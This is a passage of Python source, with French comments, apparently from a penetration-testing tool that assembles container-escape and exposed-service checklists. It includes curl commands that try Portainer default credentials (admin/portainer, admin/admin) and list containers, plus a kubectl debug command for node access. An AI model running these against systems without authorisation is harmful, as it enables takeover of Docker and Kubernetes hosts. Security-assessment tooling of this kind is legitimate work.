                ),
                severity="critical",
                notes=["kubectl peut aussi utiliser le kubelet : kubectl debug node/NODENAME -it --image=ubuntu"],
            ))

        # ── Portainer (9000/9443) ─────────────────────────────────────────────
        if port in (9000, 9443) and ("portainer" in svc_name or "portainer" in banner):
            checks.append(ContainerExternalCheck(
                title=f"Portainer — {host}:{port}",
                description=(
                    "Interface de gestion Docker. "
                    "Si un compte par défaut est présent (admin/portainer ou admin/admin), "
                    "accès complet au daemon Docker."
                ),
                command=(
                    f"# Tenter les credentials par défaut via l'API :\n"
                    f"curl -s http://{host}:{port}/api/auth "
                    f"-X POST -H 'Content-Type: application/json' "
                    f"-d '{{\"Username\":\"admin\",\"Password\":\"portainer\"}}'\n\n"
                    f"# Si token obtenu → lister les conteneurs :\n"
                    f"curl -s http://{host}:{port}/api/endpoints "
                    f"-H 'Authorization: Bearer TOKEN'"
                ),
                severity="high",
                notes=["Login : admin/portainer (install fraîche) ou admin/admin"],
            ))

    return checks


# ── Point d'entrée principal ──────────────────────────────────────────────────

def get_container_escape_checklist() -> list[ContainerCheck]:
    """
    Retourne la checklist complète d'évasion de conteneurs.
    À exécuter depuis un shell à l'intérieur du conteneur.
    """
    return (
        DETECT_CHECKS +
        CAPABILITY_CHECKS +
        SOCKET_CHECKS +
        MOUNT_CHECKS +
        KUBERNETES_CHECKS +
        CVE_CHECKS
    )


def get_quick_container_checks() -> list[ContainerCheck]:
    """Retourne uniquement les vérifications rapides/faciles (difficulty == easy)."""
    return [c for c in get_container_escape_checklist() if c.difficulty == "easy"]
